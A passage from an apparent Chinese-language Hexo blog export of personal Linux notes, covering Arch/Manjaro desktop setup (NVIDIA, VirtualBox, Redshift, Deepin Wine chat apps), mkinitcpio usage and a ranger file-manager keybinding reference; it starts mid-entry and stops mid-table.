<h4 id="Vulkan"><a href="#Vulkan" class="headerlink" title="Vulkan"></a>Vulkan</h4><p><code>~/.bash_profile</code> 加入<code>export VK_ICD_FILENAMES=/usr/share/vulkan/icd.d/nvidia_icd.json</code></p>
<p><code>printenv</code> 查看环境变量</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lspci -k | grep -A 2 -E <span class="string">&quot;(VGA|3D)&quot;</span></span><br><span class="line"></span><br><span class="line">01:00.0 3D controller: NVIDIA Corporation GM108M [GeForce 940MX]</span><br></pre></td></tr></table></figure>
<p><a href="https://nouveau.freedesktop.org/wiki/CodeNames/">https://nouveau.freedesktop.org/wiki/CodeNames/</a></p>
<p><code>GM108</code>  &gt;  <code>NV118 (GM108)</code>  &gt; <code>nv110</code></p>
<p><code>nvidia</code></p>
<p><code>nvidia-lts</code>  LTS是Long Term Support的简称,即长期支持</p>
<p><code>nvidia-dkms</code>  用DKMS自动编译Nvidia内核模块,每次更新Nvidia或内核后，将自动重新构建Nvidia模块</p>
<h2 id="输入法"><a href="#输入法" class="headerlink" title="输入法"></a>输入法</h2><p>谷歌浏览器中的拼写检查功能禁用了第三方输入法<br>进入谷歌浏览器》设置》高级》隐私设置和安全性<br>将“使用网络服务帮助解决拼写错误”取消选择</p>
<p>设置中文区域，在<code>~/.xprofile</code>中添加</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> LANG=zh_CN.UTF-8</span><br><span class="line"><span class="built_in">export</span> LANGUAGE=zh_CN:en_US</span><br><span class="line"><span class="built_in">export</span> LC_CTYPE=en_US.UTF-8</span><br></pre></td></tr></table></figure>
<h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><p>Linux字体配置.md</p>
<h2 id="virtualbox"><a href="#virtualbox" class="headerlink" title="virtualbox"></a>virtualbox</h2><p>安装软件包 <code>virtualbox</code>内核模块的安装方式要从下面二选一：</p>
<ul>
<li>如果在用rach默认的内核，安装 <code>virtualbox-host-modules-arch</code></li>
<li>如果用了<a href="https://wiki.archlinux.org/index.php/Kernel">其它的内核</a>，需要安装 <code>virtualbox-host-dkms</code></li>
</ul>
<p><strong>还需要安装相应内核的内核头文件(如： linux-headers)</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S virtualbox virtualbox-host-modules-arch</span><br><span class="line"><span class="comment"># 手动加载vboxdrv模块,或重启就能使用了</span></span><br><span class="line">modprobe vboxdrv</span><br></pre></td></tr></table></figure>
<ul>
<li><code>vboxnetadp</code> 和 <code>vboxnetflt</code>：使用桥接网络和host-only 网络功能时都需要的。<code>vboxnetadp</code> 模块用于在 VirtualBox 全局配置里为主体机创建虚拟网卡；<code>vboxnetflt</code> 模块在使用了该功能的客体机启动时起作用<br>如果要使用 Host-only 网络 或是桥接网络功能，要确保安装了 <code>net-tools</code></li>
</ul>
<p>创建虚拟机 启动虚拟机时报错，一般都是是模块没有加载或有权限许可问题，可用<code>vboxreload</code> 解决</p>
<p>如果在 <code>VirtualBox</code> 内核模块运行期间更新了模块软件包，为了使用新版本，需要手动重新加载这些模块。在 root 权限下运行 <code>vboxreload</code> 即可重新加载。</p>
<p>将用户eonun添加进vboxusers用户组<br><code>sudo usermod -a -G vboxusers eonun</code></p>
<p>检查是否加入<br><code>cat /etc/group | grep vboxusers</code></p>
<h2 id="护眼调光"><a href="#护眼调光" class="headerlink" title="护眼调光"></a>护眼调光</h2><p>通过 <code>yay redshift-gtk-git</code> 安装带前端的版本,通过<code>redshift-gtk</code>(有状态栏图标) 或<code>redshift</code>(无图标)</p>
<p>开机自启</p>
<ul>
<li><code>systemctl --user enable redshift.service</code>或<code>systemctl --user enable redshift-gtk.service</code></li>
<li>或在<code>~/.config/i3/config</code>加入<code>exec_always redshift-gtk</code></li>
<li>或在运行<code>redshif-gtk</code>后在图标上右键勾选开机启动即可</li>
</ul>
<p>使用Nvidia驱动程序时，当分辨率超过1080p时，Redshift将屏幕变为绿色<br>这是nvidia驱动程序的错误。一个解决方法是进行以下编辑：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;X11&#x2F;xorg.conf.d&#x2F;20-nvidia.conf</span><br><span class="line"></span><br><span class="line">Section &quot;Device&quot;</span><br><span class="line">    ...</span><br><span class="line">    Option         &quot;UseNvKmsCompositionPipeline&quot; &quot;false&quot;</span><br><span class="line">    ...</span><br><span class="line">EndSection</span><br></pre></td></tr></table></figure></p>
<p>创建 <code>~/.config/redshift/redshift.conf</code> 配置文件加入配置内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">; =================</span><br><span class="line">; redshift 配置文件</span><br><span class="line">; =================</span><br><span class="line"></span><br><span class="line">[redshift]</span><br><span class="line">; 设置白天和晚上的屏幕色温</span><br><span class="line">temp-day=5700</span><br><span class="line">temp-night=2400</span><br><span class="line"></span><br><span class="line">; 当Redshift开始和停止时，禁用色温之间的平滑衰减</span><br><span class="line">; 0将导致屏幕温度之间立即变化</span><br><span class="line">; 1将在几秒钟内逐步应用新的屏幕色温</span><br><span class="line">fade=1</span><br><span class="line"></span><br><span class="line">; 太阳高度阈值</span><br><span class="line">; 默认情况下，Redshift将使用当前的太阳高度来确定是白天，夜晚还是过渡（黎明/黄昏）</span><br><span class="line">; 当太阳高于高海拔指定的度数时，则被视为白天；低于太阳高海拔指定的度数时，则被视为夜晚</span><br><span class="line">;elevation-high=3</span><br><span class="line">;elevation-low=-6</span><br><span class="line"></span><br><span class="line">; 自定义黎明/黄昏间隔</span><br><span class="line">; 无需使用太阳高度，可以手动指定黎明和黄昏的时间间隔</span><br><span class="line">; 时间必须以24小时格式指定为HH：MM</span><br><span class="line">;dawn-time=6:00-7:45</span><br><span class="line">;dusk-time=18:35-20:15</span><br><span class="line"></span><br><span class="line">; 设置屏幕亮度, 默认值为1.0</span><br><span class="line">;brightness=0.9</span><br><span class="line">; 白天和黑夜也可以使用不同的设置 (version &gt;=1.8)</span><br><span class="line">;brightness-day=0.7</span><br><span class="line">;brightness-night=0.4</span><br><span class="line">;  设置屏幕灰度系数（用于所有颜色，或分别用于每个颜色通道）</span><br><span class="line">gamma=0.8</span><br><span class="line">;gamma=0.8:0.7:0.8</span><br><span class="line">; 从1.10版开始，白天和黑夜可单独设置famma</span><br><span class="line">;gamma-day=0.8:0.7:0.8</span><br><span class="line">;gamma-night=0.6</span><br><span class="line"></span><br><span class="line">; 设置位置提供者：<span class="string">&#x27;geoclue2&#x27;</span>，<span class="string">&#x27;manual&#x27;</span>键入<span class="string">&#x27;redshift -l list&#x27;</span>以查看可能的值</span><br><span class="line">; 位置提供程序的设置位于其他部分</span><br><span class="line">location-provider=manual</span><br><span class="line"></span><br><span class="line">; 设置调整方法：<span class="string">&#x27;randr&#x27;</span>，<span class="string">&#x27;vidmode&#x27;</span>键入<span class="string">&#x27;redshift -m list&#x27;</span>以查看所有可能的值。 “ randr”是首选方法，“ vidmode”是较旧的API。 但是在某些情况下，“ randr”无效。</span><br><span class="line">; 调整方法设置在其他部分中</span><br><span class="line">adjustment-method=randr</span><br><span class="line"></span><br><span class="line">; 经纬位置：</span><br><span class="line">; 输入“ redshift -l PROVIDER:<span class="built_in">help</span>”以查看设置</span><br><span class="line">; 例如：“redshift -l manual:<span class="built_in">help</span>”</span><br><span class="line">; 例如北京的经纬度</span><br><span class="line">[manual]</span><br><span class="line">lat=39.90</span><br><span class="line">lon=116.41</span><br><span class="line"></span><br><span class="line">; 屏幕调整工具设置</span><br><span class="line">; 输入“ redshift -m randr:<span class="built_in">help</span>”查看帮助</span><br><span class="line">; 屏幕编号从0开始</span><br><span class="line">; 如果未指定此选项，则Redshift将尝试调整_all_屏幕</span><br><span class="line">[randr]</span><br><span class="line">screen=0</span><br></pre></td></tr></table></figure>
<p><a href="https://blog.gongbushang.com/tech/2016/11/09/ArchLinux%E6%8A%A4%E7%9C%BC%E6%B3%95%E5%AE%9D.html">https://blog.gongbushang.com/tech/2016/11/09/ArchLinux%E6%8A%A4%E7%9C%BC%E6%B3%95%E5%AE%9D.html</a></p>
<p><a href="https://wiki.archlinux.org/index.php/Redshift">https://wiki.archlinux.org/index.php/Redshift</a></p>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一般可以放在&#x2F;etc&#x2F;rc.d&#x2F;rc.local文件中（rpm系统用来给用户自己配置自需的启动项目的，deb的系统中可以在&#x2F;etc&#x2F;init.d&#x2F;下自己创建启动项目（RPM的系统中也可以）。。。。。。</span><br><span class="line"></span><br><span class="line">另外在 Bash和TCshell中的一些启动文件 如下：</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;profile 登录时自动执行</span><br><span class="line"></span><br><span class="line">&#96;~&#x2F;.bash_profile&#96;,&#96;~&#x2F;.bash_login&#96;, &#96;~&#x2F;.profile&#96; 登录时自动执行</span><br><span class="line"></span><br><span class="line">&#96;~&#x2F;.bashrc&#96; shell 登录时自动执行</span><br><span class="line"></span><br><span class="line">&#96;~&#x2F;.bash_logout&#96; 退出时自动执行</span><br><span class="line"></span><br><span class="line">&#96;~&#x2F;.bash_history&#96; 记录最近会话中的命令</span><br><span class="line"></span><br><span class="line">&#96;&#x2F;etc&#x2F;passwd&#96; 记录用户资源等信息</span><br><span class="line"></span><br><span class="line">&#96;~&#x2F;.cshrc&#96; 或 ~&#x2F;.tcshrc 每个shell启动时自动执行</span><br><span class="line"></span><br><span class="line">&#96;~&#x2F;.login&#96; 执行完.cshrc或.tcshrc后，又登录shell执行</span><br><span class="line"></span><br><span class="line">&#96;~&#x2F;.cshdirs&#96; 在tcsh.login后执行</span><br><span class="line"></span><br><span class="line">&#96;~&#x2F;.logout&#96; 在csh 或tcsh退出时执行</span><br></pre></td></tr></table></figure>
<p>XDG 基本目录规范包含以下概念:</p>
<p><code>XDG_DATA_HOME</code> 下存放用户数据文件，默认值是 ~/.local/share<br><code>XDG_CONFIG_HOME</code> 下存放用户配置文件，默认值是 ~/.config<br><code>XDG_DATA_DIRS</code> 定义一组以 : 分隔的有序目录集，规定了除 <code>XDG_DATA_HOME</code> 外的搜索路径，默认值是 /usr/local/share/:/usr/share/<br><code>XDG_CONFIG_DIRS</code> 定义一组以 : 分隔的有序目录集，规定了除 <code>XDG_CONFIG_HOME</code> 外的搜索路径，默认值是 /etc/xdg<br><code>XDG_CACHE_HOME</code> 下存放用户的缓存文件，默认值是 ~/.cache<br><code>XDG_RUNTIME_DIR</code> 下存放运行时的用户文件，比如 sockets、named pipes。此目录必须属于该用户，并且他必须是用户中唯一拥有读/写操作的以为，换句话说便是 0700 权限<br>对于 <code>XDG_CONFIG_DIRS</code>(<code>XDG_DATA_DIRS</code>) 来说，顺序代表了这些目录的重要性，第一个列出的目录是最重要的</p>
<h3 id="图标"><a href="#图标" class="headerlink" title="图标"></a>图标</h3><p>                                                      </p>
<p>                                              </p>
<p>                                             </p>
<p>                                         </p>
<p>⮘    ⮙    ⮚    ⮛    ⮜    ⮝    ⮞    ⮟</p>
<h2 id="深度-QQ-TIM-微信"><a href="#深度-QQ-TIM-微信" class="headerlink" title="深度 QQ/TIM/微信"></a>深度 QQ/TIM/微信</h2><p><code>deepin-wine-qq</code> 、 <code>deepin-wine-tim</code> 、 <code>deepin-wine-wechat</code></p>
<p>默认安装使用的是原版wine，安装后使用可使用自动脚本切换到<code>deepin-wine</code>：</p>
<p><code>/opt/apps/com.qq.xxxxx.deepin/files/run.sh -d</code></p>
<p>创建软链接:</p>
<p><code>sudo ln -s /opt/apps/com.qq.im.deepin/files/run.sh /usr/bin/qq</code></p>
<p><code>sudo ln -s /opt/apps/com.qq.office.deepin/files/run.sh /usr/bin/tim</code></p>
<p><code>sudo ln -s /opt/apps/com.qq.weixin.deepin/files/run.sh /usr/bin/wechat</code></p>
<h3 id="备选"><a href="#备选" class="headerlink" title="备选"></a>备选</h3><p><code>com.qq.weixin.spark</code>、<code>com.qq.tim.spark</code></p>
<p><code>/opt/apps/com.qq.weixin.deepin/files/run.sh</code></p>
<p><code>/opt/apps/com.qq.tim.spark/files/run.sh</code></p>
<h2 id="微信企业版"><a href="#微信企业版" class="headerlink" title="微信企业版"></a>微信企业版</h2><p>企业版: <code>deepin.com.weixin.work</code> (AUR)</p>
<h2 id="钉钉"><a href="#钉钉" class="headerlink" title="钉钉"></a>钉钉</h2><p><code>dingtalk-electron</code>(AUR)</p>
<h2 id="有道词典"><a href="#有道词典" class="headerlink" title="有道词典"></a>有道词典</h2><p><code>youdao-dict</code>(AUR) 不建议使用，<code>tesseract</code> 会在后台不停启动多个进程直至内存被完全占完</p>
<h2 id="轻量级浏览器"><a href="#轻量级浏览器" class="headerlink" title="轻量级浏览器"></a>轻量级浏览器</h2><p><code>netsurf</code></p>
<h2 id="百度网盘"><a href="#百度网盘" class="headerlink" title="百度网盘"></a>百度网盘</h2><p><code>baidunetdisk-bin</code> (AUR)</p>
<p><code>sudo ln -s /usr/lib/baidunetdisk/baidunetdisk /usr/bin/baidunetdisk</code></p>
]]></content>
      <categories>
        <category>i3</category>
      </categories>
      <tags>
        <tag>i3wm</tag>
      </tags>
  </entry>
  <entry>
    <title>mkinitcpio详解</title>
    <url>/posts/7cc5c3d6/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>initramfs映像是一个SVR4 CPIO归档文件，通过find和bsdcpio命令生成，可选择使用内核理解的压缩方案进行压缩<br>mkinitcpio是创建initramfs的bash脚本</p>
<p>每次升级内核，mkinitcpio都会默认创建两个内存盘镜像：默认镜像<code>/boot/initramfs-linux.img</code>和fallback镜像<code>/boot/initramfs-linux-fallback.img</code>。fallback镜像和默认镜像只有一个区别，就是创建时跳过了autodetect钩子扩展，因而它包含更多的内核模块。autodetect扩展会探测硬件信息，针对硬件向镜像添加需要的模块，因此缩小了镜像。</p>
<h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><h3 id="使用默认内核linux生成镜像："><a href="#使用默认内核linux生成镜像：" class="headerlink" title="使用默认内核linux生成镜像："></a>使用默认内核<code>linux</code>生成镜像：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkinitcpio -p linux</span><br></pre></td></tr></table></figure>
<p><code>-p</code>选项定义了要使用的预配置（preset）；多数内核软件包都会提供一套mkinitcpio预配置文件，放在<code>/etc/mkinitcpio.d</code>目录（比如，linux内核是/etc/mkinitcpio.d/linux.preset）。预配置文件中包含内存盘镜像的基本配置。</p>
<a id="more"></a>
<h3 id="生成自定义initcpio"><a href="#生成自定义initcpio" class="headerlink" title="生成自定义initcpio"></a>生成自定义initcpio</h3><p>使用其他配置文件创建镜像，例如以<code>/etc/mkinitcpio-custom.conf</code>配置的内容生成镜像<code>/boot/linux-custom.img</code><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkinitcpio -c /etc/mkinitcpio-custom.conf -g /boot/linux-custom.img</span><br></pre></td></tr></table></figure></p>
<p>使用指定内核创建镜像，可在<code>/usr/lib/modules</code>目录下可查看支持的内核<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkinitcpio -g /boot/linux-custom2.img -k 4.19.69-1-MANJARO</span><br></pre></td></tr></table></figure></p>
<h2 id="mkinitcpio用法："><a href="#mkinitcpio用法：" class="headerlink" title="mkinitcpio用法："></a>mkinitcpio用法：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkinitcpio [选项]</span><br><span class="line"> 选项：</span><br><span class="line">   -A，--addhooks &lt;hooks&gt; 	将指定的钩子（以逗号分隔）添加到映像</span><br><span class="line">   -c，--config &lt;config&gt; 	使用备用配置文件。 （默认值：/etc/mkinitcpio.conf）</span><br><span class="line">   -g，--generate &lt;路径&gt; 	生成cpio映像并写入指定的路径</span><br><span class="line">   -H，--hookhelp &lt;hookname&gt; 显示给定钩子和退出的帮助</span><br><span class="line">   -h，--<span class="built_in">help</span> 				显示此消息并退出</span><br><span class="line">   -k，--kernel &lt;kernelver&gt; 使用指定的内核版本（默认值：4.19.69-1-MANJARO）</span><br><span class="line">   -L，--listhooks 			列出所有可用的钩子</span><br><span class="line">   -M，--automods 			通过自动检测找到的显示模块</span><br><span class="line">   -n，--nocolor 			禁用彩色输出消息</span><br><span class="line">   -p，--preset &lt;文件&gt; 		从/etc/mkinitcpio.d构建指定的预设</span><br><span class="line">   -P，--allpresets 		处理/etc/mkinitcpio.d中的所有预设文件</span><br><span class="line">   -r，--moduleroot &lt;dir&gt; 	模块的根目录（默认值：/）</span><br><span class="line">   -S，--skiphooks &lt;hooks&gt; 	在构建过程中跳过用逗号分隔的指定钩子</span><br><span class="line">   -s，--save 				保存构建目录。 （默认值：否）</span><br><span class="line">   -d，--genicir &lt;dir&gt; 		将生成的图像写入&lt;dir&gt;</span><br><span class="line">   -t，--builddir &lt;dir&gt; 	使用DIR作为临时构建目录</span><br><span class="line">   -V，--version 			显示版本信息并退出</span><br><span class="line">   -v，--verbose 			详细输出（默认值：no）</span><br><span class="line">   -z，--compress &lt;程序&gt; 	在映像上使用备用压缩器</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>命令</tag>
      </tags>
  </entry>
  <entry>
    <title>ranger终端文件管理器</title>
    <url>/posts/c9854b1/</url>
    <content><![CDATA[<p><a href="https://github.com/ranger/ranger">ranger</a> 是一个以Python编写，绑定vi/vim键的终端文件管理器</p>
<h1 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># archlinux系</span></span><br><span class="line">sudo pacman -S ranger</span><br><span class="line"><span class="comment"># redhat系</span></span><br><span class="line">sudo yum install -y ranger</span><br><span class="line"><span class="comment"># Debian系</span></span><br><span class="line">sudo apt-get install -y ranger</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="ranger命令选项"><a href="#ranger命令选项" class="headerlink" title="ranger命令选项"></a>ranger命令选项</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--version 				<span class="comment">#显示程序的版本号并退出</span></span><br><span class="line">-h，--<span class="built_in">help</span> 				<span class="comment">#显示此帮助消息并退出</span></span><br><span class="line">-d，--debug 			<span class="comment">#激活调试模式,出错时退出并打印错误</span></span><br><span class="line">-c，--clean 			<span class="comment">#不要读取或创建任何配置文件，不会在系统留下痕迹</span></span><br><span class="line">--logfile=file 			<span class="comment">#要使用的日志文件，&#x27;-&#x27;代表stderr</span></span><br><span class="line">--cachedir=dir 			<span class="comment">#更改缓存目录（~/.cache/ranger）</span></span><br><span class="line">-r dir，--confdir=dir 	<span class="comment">#更改配置目录（~/.config/ranger）</span></span><br><span class="line">--datadir=dir 			<span class="comment">#更改数据目录（~/.local/share/ranger）</span></span><br><span class="line">--copy-config=<span class="built_in">which</span> 	<span class="comment">#将默认配置复制到用户配置目录，可用值：all, rc, rifle, commands,commands_full, scope</span></span><br><span class="line">--choosefile=OUTFILE 	<span class="comment">#使Ranger像文件选择器一样工作，打开文件时，它将退出并将所选文件的名称写入OUTFILE。</span></span><br><span class="line">--choosefiles=OUTFILE 	<span class="comment">#使Ranger就像一次选择多个文件一样，打开文件时，它将退出并将所有选定文件的名称写入OUTFILE。</span></span><br><span class="line">--choosedir=OUTFILE 	<span class="comment">#使Ranger像目录选择器一样工作，退出Ranger时，它将最后访问的目录的名称写入OUTFILE</span></span><br><span class="line">--selectfile=filepath 	<span class="comment">#打开带有选定文件的游侠</span></span><br><span class="line">--show-only-dirs 		<span class="comment">#仅显示目录，不显示文件或链接</span></span><br><span class="line">--list-unused-keys 		<span class="comment">#出未绑定到任何动作的通用键</span></span><br><span class="line">--list-tagged-files=tag <span class="comment">#列出所有使用给定标签标记的文件，默认：*</span></span><br><span class="line">--profile 				<span class="comment">#输出退出时CPU使用率的统计信息</span></span><br><span class="line">--cmd=COMMAND 			<span class="comment">#读取配置后执行COMMAND，多次使用此选项可运行多个命令</span></span><br></pre></td></tr></table></figure>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul>
<li>生成配置文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ranger --copy-config=all</span><br><span class="line"><span class="comment"># 该命令自动将配置文件复制到~/.config/ranger/，作为用户配置文件</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>相关配置文件</p>
<ul>
<li><code>~/.config/ranger/rc.conf</code> 主配置文件，选项设置和快捷键</li>
<li><code>~/.config/ranger/scope.sh</code> 设置可预览的文件类型</li>
<li><code>~/.config/ranger/rifle.conf</code> 指定不同类型文件的默认打开程序</li>
<li><code>~/.config/ranger/commands.py</code> 能通过<code>:</code>执行的命令</li>
<li><code>~/.config/ranger/commands_full.py</code> 默认的控制台命令</li>
<li><code>~/.config/ranger/bookmarks</code> 书签列表，可在该文件中批量添加书签</li>
<li><code>~/.config/ranger/tagged</code> 标记文件的绝对路径</li>
<li><code>~/.config/ranger/history</code> 控制台命令的历史记录，默认50条</li>
</ul>
</li>
<li><p>相关文件夹</p>
<ul>
<li><code>~/.config/ranger/colorschemes/</code> 颜色主题文件夹</li>
<li><code>~/.config/ranger/plugins/</code> 插件文件夹</li>
</ul>
</li>
</ul>
<p>文件scope.sh中, 在externsions部分注释掉不想预览的文件类型, 在那行上面添加”#”注释掉即可。<strong>ranger在预览 <code>rar</code> 等压缩包时会运行得比较慢</strong></p>
<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a>帮助</h3><ul>
<li><code>?</code> 或 <code>F1</code> 指令<ul>
<li><code>m</code> 打开man帮助页</li>
<li><code>k</code> 显示键位绑定</li>
<li><code>c</code> 显示可用ranger的命令</li>
<li><code>s</code> 显示配置</li>
<li><code>q</code> 退出帮助</li>
</ul>
</li>
</ul>
<h3 id="浏览界面"><a href="#浏览界面" class="headerlink" title="浏览界面"></a>浏览界面</h3><div class="table-container">
<table>
<thead>
<tr>
<th>按键</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>k</code> 或 <code>&lt;UP&gt;</code> <br><code>j</code> 或 <code>&lt;DOWN&gt;</code> <br><code>h</code> 或 <code>&lt;LEFI&gt;</code> <br><code>l</code> 或 <code>&lt;RIGHT&gt;</code> 或 <code>&lt;ENTER&gt;</code></td>
<td>上 <br>下 <br>左(上一级目录) <br>右(进入目录，打开文件)</td>
</tr>
<tr>
<td><code>K</code> 或 <code>^u</code> <br><code>J</code> 或 <code>^d</code></td>
<td>上翻半页 <br>下翻半页</td>
</tr>
<tr>
<td><code>H</code> <br><code>L</code></td>
<td>上一历史记录 <br>下一历史记录</td>
</tr>
<tr>
<td><code>&lt;PAGEUP&gt;</code> 或 <code>^b</code> <br> <code>&lt;PAGEDOWN&gt;</code> 或 <code>^f</code></td>
<td>上翻一页 <br>下翻一页</td>
</tr>
<tr>
<td><code>gg</code> 或 <code>&lt;HOME&gt;</code> <br><code>G</code> 或 <code>&lt;END&gt;</code></td>
<td>跳到顶端 <br>跳到底端</td>
</tr>
<tr>
<td><code>[</code> <br><code>]</code></td>
<td>父目录上移 <br>父目录下移</td>
</tr>
<tr>
<td><code>g</code> + <code>对应字母</code> 跳转相应目录</td>
<td><code>gh</code>：<code>~</code> go home <br><code>g?</code>：<code>/usr/share/doc/ranger</code> <br><code>gR</code>：<code>/usr/lib/python2.7/dist-packages/ranger</code> <br><code>gd</code>：<code>/dev</code> <br><code>ge</code>：<code>/etc</code> <br><code>gm</code>：<code>/media</code> <br><code>gM</code>：<code>/mnt</code> <br><code>go</code>：<code>/opt</code> <br><code>gs</code>：<code>/srv</code> <br><code>gu</code>：<code>/usr</code> <br><code>gv</code>：<code>/var</code> <br><code>gr</code> 或 <code>g/</code>：<code>/</code></td>
</tr>
<tr>
<td><code>gl</code> 或<code>gL</code></td>
<td>若当前项为符号链接，逃到其原始位置</td>
</tr>
<tr>
<td><code>cd</code></td>
<td>跳转到目录，同 <code>:cd</code></td>
</tr>
<tr>
<td><code>f</code> 或 <code>/</code></td>
<td>搜索查找</td>
</tr>
<tr>
<td><code>z</code> + <code>对应字母</code> 设置相关属性</td>
<td><code>h</code> 或 <code>^h</code> 显示/隐藏文件 <br><code>p</code> 开/关文件预览功能 <br> <code>P</code> 开/关目录预览功能 <br><code>c</code>    当文件预览不可见时，是否应该折叠右栏，使主栏扩大 <br><code>d</code> 文件夹是否在文件前面 <br><code>I</code> 每次按键后是否刷新输入 <br><code>m</code> 是否能用鼠标。如果能，则左键光标移动，右键打开，滚轮上下 <br><code>s</code> 排序是否区分大小写 <br><code>u</code> 是否自动更新状态栏上显示的该目录所有文件大小的值 <br><code>v</code>    是否启用预览脚本 <br><code>i</code> 是否预览图片</td>
</tr>
</tbody>
</table>
</div>
<h3 id="选择条目"><a href="#选择条目" class="headerlink" title="选择条目"></a>选择条目</h3><div class="table-container">
<table>
<thead>
<tr>
<th>按键</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;SPACE&gt;</code></td>
<td>选择文件并跳到下一项</td>
</tr>
<tr>
<td><code>v</code></td>
<td>反选</td>
</tr>
<tr>
<td><code>V</code></td>
<td>进入可视模式，结合移动键进行选择,配合可 <code>gg</code>, <code>G</code> 使用</td>
</tr>
<tr>
<td><code>uv</code></td>
<td>取消选择</td>
</tr>
<tr>
<td><code>^v</code></td>
<td>从某个位置开始选择</td>
</tr>
</tbody>
</table>
</div>
<h3 id="新建条目"><a href="#新建条目" class="headerlink" title="新建条目"></a>新建条目</h3><div class="table-container">
<table>
<thead>
<tr>
<th>按键</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;INSERT&gt;</code></td>
<td>新建文件,同 <code>:touch</code></td>
</tr>
<tr>
<td><code>&lt;F7&gt;</code></td>
<td>新建文件夹,同 <code>:mkdir</code></td>
</tr>
</tbody>
</table>
</div>
<h3 id="删除条目"><a href="#删除条目" class="headerlink" title="删除条目"></a>删除条目</h3><div class="table-container">
<table>
<thead>
<tr>
<th>按键</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>dD</code> 或 <code>&lt;F8&gt;</code></td>
<td>删除条目(文件或文件夹) , 同 <code>:delete</code></td>
</tr>
<tr>
<td><code>DD</code></td>
<td>将条目移动到回收站</td>
</tr>
</tbody>
</table>
</div>
<h3 id="查看编辑文件"><a href="#查看编辑文件" class="headerlink" title="查看编辑文件"></a>查看编辑文件</h3><div class="table-container">
<table>
<thead>
<tr>
<th>按键</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>i</code> 或 <code>&lt;F3&gt;</code></td>
<td>查看当前文本文件内容</td>
</tr>
<tr>
<td><code>E</code> 或 <code>&lt;F4&gt;</code></td>
<td>调用默认编辑器编辑文件</td>
</tr>
</tbody>
</table>
</div>
<h3 id="重命名"><a href="#重命名" class="headerlink" title="重命名"></a>重命名</h3><div class="table-container">
<table>
<thead>
<tr>
<th>按键</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>cw</code></td>
<td>重命名</td>
</tr>
<tr>
<td><code>I</code></td>
<td>修改当前命名,光标在最前</td>
</tr>
<tr>
<td><code>a</code></td>
<td>修改当前命名,光标在后缀前</td>
</tr>
<tr>
<td><code>A</code></td>
<td>修改当前命名,光标在最后</td>
</tr>
</tbody>
</table>
</div>
<h4 id="批量修改文件名"><a href="#批量修改文件名" class="headerlink" title="批量修改文件名"></a>批量修改文件名</h4><p>批量选择文件后, 键入命令 <code>:bulkname</code>  会打开编辑器, 将列出文件名编辑后保存退出，确认编辑, 然后就批量改名了, 如果想取消批量改名, 在确认时把内容删除即</p>
<h3 id="移动复制"><a href="#移动复制" class="headerlink" title="移动复制"></a>移动复制</h3><div class="table-container">
<table>
<thead>
<tr>
<th>按键</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>dd</code> 或 <code>&lt;F6&gt;</code></td>
<td>移动</td>
</tr>
<tr>
<td><code>yy</code> 或 <code>&lt;F5&gt;</code></td>
<td>复制</td>
</tr>
<tr>
<td><code>da</code>、<code>ya</code></td>
<td>添加文件到移动、复制队列</td>
</tr>
<tr>
<td><code>dr</code>、<code>yr</code></td>
<td>将文件从移动、复制队列移除</td>
</tr>
<tr>
<td><code>dt</code>、<code>yt</code></td>
<td>切换文件是否在移动、复制队列中</td>
</tr>
<tr>
<td><code>dk</code>、<code>yk</code></td>
<td>将当前文件与上一个文件添加到移动、复制队列</td>
</tr>
<tr>
<td><code>dj</code>、<code>yj</code></td>
<td>将当前文件与下一个文件添加到移动、复制队列</td>
</tr>
<tr>
<td><code>dgg</code>、<code>ygg</code></td>
<td>当前位置到顶端的所有文件添加到移动、复制队列</td>
</tr>
<tr>
<td><code>dG</code>、<code>yG</code></td>
<td>当前位置到末尾的所有文件添加到移动、复制队列</td>
</tr>
<tr>
<td><code>ud</code>、<code>uy</code></td>
<td>取消移动、复制</td>
</tr>
</tbody>
</table>
</div>
<h3 id="粘贴"><a href="#粘贴" class="headerlink" title="粘贴"></a>粘贴</h3><div class="table-container">
<table>
<thead>
<tr>
<th>按键</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>pp</code></td>
<td>粘贴</td>
</tr>
<tr>
<td><code>pP</code></td>
<td>若有同名条目自动命名后粘贴</td>
</tr>
<tr>
<td><code>po</code></td>
<td>若有同名条目则覆盖原有条目粘贴</td>
</tr>
<tr>
